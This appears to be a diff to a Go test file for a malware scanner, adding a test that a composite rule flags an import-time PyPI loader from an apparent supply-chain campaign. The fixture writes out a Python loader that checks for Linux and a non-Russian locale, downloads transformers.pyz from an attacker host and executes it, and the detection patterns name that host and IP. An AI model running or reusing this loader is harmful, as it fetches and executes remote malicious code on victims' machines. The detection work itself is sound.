@@ -145,6 +145,43 @@ func TestArchiveInspectionFindsEmbeddedMetadataAndIOC(t *testing.T) {
 	assertSeverityContains(t, findings, "high", "ioc-string", "PyPI payload URL")
 }
 
+func TestPyPILoaderCompositeRequiresPayloadSignal(t *testing.T) {
+	detection := NewMiniShaiHuludDetectionWithRemote(&RemoteDetectionPack{
+		ID:       miniShaiHuludID,
+		Campaign: miniShaiHuludCampaign,
+		CompositeIOCs: []RemoteCompositeIOC{{
+			Label:      "PyPI import-time transformers.pyz loader",
+			Severity:   "critical",
+			MinMatches: 5,
+			Signals: []RemoteIOC{
+				{Label: "Python downloader", Pattern: `(?i)(urllib\.request|requests\.|httpx\.|urlretrieve|urlopen)`},
+				{Label: "transformers.pyz payload", Pattern: `(?i)(git-tanstack\.com/tmp/transformers\.pyz|83\.142\.209\.194/.{0,80}transformers\.pyz|/tmp/transformers\.pyz)`},
+				{Label: "process execution", Pattern: `(?i)(subprocess\.|os\.system|Popen\(|python3?\s+/.{0,80}transformers\.pyz)`},
+				{Label: "Linux import gate", Pattern: `(?i)(sys\.platform.{0,80}linux|platform\.system\(\).{0,80}Linux|os\.uname\(\))`},
+				{Label: "Russian locale evasion", Pattern: `(?i)(LANG|LC_ALL|locale|getlocale|ru_RU|Russian)`},
+			},
+		}},
+	})
+
+	benignPipLike := []byte("import urllib.request, subprocess, locale, os\nif sys.platform == 'linux': subprocess.Popen(['echo'])\n")
+	var benignFindings []Finding
+	detection.ScanFile(FileContext{Path: "pip/_vendor/distlib/util.py", Base: "util.py", Slash: "pip/_vendor/distlib/util.py", Data: benignPipLike}, func(finding Finding) {
+		benignFindings = append(benignFindings, finding)
+	})
+	for _, finding := range benignFindings {
+		if strings.Contains(finding.Evidence, "PyPI import-time transformers.pyz loader") {
+			t.Fatalf("expected pip-like utility text without payload URL not to match composite, got %#v", benignFindings)
+		}
+	}
+
+	maliciousLoader := []byte("import urllib.request, subprocess, locale, sys\nif sys.platform == 'linux' and locale.getlocale()[0] != 'ru_RU':\n urllib.request.urlretrieve('https://git-tanstack.com/tmp/transformers.pyz', '/tmp/transformers.pyz')\n subprocess.Popen(['python3','/tmp/transformers.pyz'])\n")
+	var maliciousFindings []Finding
+	detection.ScanFile(FileContext{Path: "guardrails/__init__.py", Base: "__init__.py", Slash: "guardrails/__init__.py", Data: maliciousLoader}, func(finding Finding) {
+		maliciousFindings = append(maliciousFindings, finding)
+	})
+	assertSeverityContains(t, maliciousFindings, "critical", "ioc-string", "PyPI import-time transformers.pyz loader: 100% match")
+}
+
 func TestPackageCSVParsing(t *testing.T) {
 	parsed := parsePackageCSV(`Package,Version
 @scope/quoted,"= 1.2.3, = 1.2.4"
